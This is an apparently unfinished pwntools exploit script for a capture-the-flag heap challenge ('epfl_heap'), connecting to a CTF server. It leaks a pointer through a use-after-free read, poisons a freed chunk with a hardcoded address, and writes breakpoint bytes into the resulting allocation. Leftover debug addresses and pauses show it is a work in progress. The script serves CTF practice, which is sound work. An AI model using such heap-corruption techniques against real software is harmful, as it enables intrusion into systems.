#!/usr/bin/env python3

from pwn import *

exe = ELF("./epfl_heap")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = "alacritty -e".split()


def conn():
    if args.REMOTE:
        io = remote("chall.polygl0ts.ch", 9004)
    else:
        if args.GDB:
            io = gdb.debug([exe.path], aslr=False, api=False, gdbscript="""
            set follow-fork-mode parent
            """, env={"LD_PRELOAD": "./frida-gadget.so", "LD_LIBRARY_PATH": "./libs"})
        else:
            io = process([exe.path], env={"LD_PRELOAD": "./frida-gadget.so", "LD_LIBRARY_PATH": "./libs"})
            #gdb.attach(io)
    return io


idx = 0
def alloc(io, size):
    global idx
    io.sendlineafter(b">", b"1")
    io.sendlineafter(b"size?", str(size).encode())
    idx += 1
    return idx-1


def delete(io, idx):
    io.sendlineafter(b">", b"4")
    io.sendlineafter(b"index?", str(idx).encode())


def read(io, idx):
    io.sendlineafter(b">", b"3")
    io.sendlineafter(b"index?", str(idx).encode())
        
    io.recvuntil(b"data: \n")
    until = b"*EPFL* ~Heap Menu~"
    return io.readuntil(until)[:-len(until)]


def write(io, idx, payload):
    io.sendlineafter(b">", b"2")
    io.sendlineafter(b"index?", str(idx).encode())
    io.sendlineafter(b"data? ", payload)


def main():
    io = conn()
    a = alloc(io, 16)
    alloc(io, 16)
    b = alloc(io, 16)
    alloc(io, 16)
    c = alloc(io, 16)

    delete(io, a)
    leak = u64(read(io, b)[:6].ljust(8, b"\x00"))
    info(f"leak: {hex(leak)}")

    hax = leak-0x3619c0
    hax = 0x7ffff7628490

    hax = 0x555555555ac0
    write(io, b, p64(hax))

    d = alloc(io, 16)
    input('asd')
    e = alloc(io, 16)

    write(io, e, b"\xcc\xcc\xcc\xcc")
    io.interactive()
    


if __name__ == "__main__":
    main()
